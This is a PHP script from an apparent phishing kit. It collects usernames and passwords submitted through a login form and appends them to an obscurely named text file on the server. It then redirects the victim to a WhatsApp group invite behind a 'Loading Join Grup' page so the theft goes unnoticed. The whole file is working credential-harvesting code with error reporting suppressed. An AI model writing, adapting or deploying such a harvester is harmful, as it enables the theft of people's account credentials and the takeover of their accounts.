<?php
error_reporting(0);


$filename = "askjdlahd12o3yo1278sjad.txt";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
//exit($contents);
if(!strpos($contents, 'Email : '.trim($_POST['username']).' <br>') !== FALSE) {
    $email = $_POST['username'];
$pass = $_POST['pass'];

$message   = "
Email : ".$email." <br>
Password :  ".$pass." <br>";
$f = fopen('askjdlahd12o3yo1278sjad.txt', 'a');
fwrite($f, $message);
fclose($f);

}

    
echo "<script LANGUAGE=\"JavaScript\">
<!--
// -->
</script>";
?>
<?php
$random = rand(1000,5000);
?>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Loading Join Grup</title>
<meta http-equiv="Refresh" content="1; URL=https://chat.whatsapp.com/invite/C5UC29CVQ4x5s7KJCbA6hU"/>
</head><body>
</body>
</html>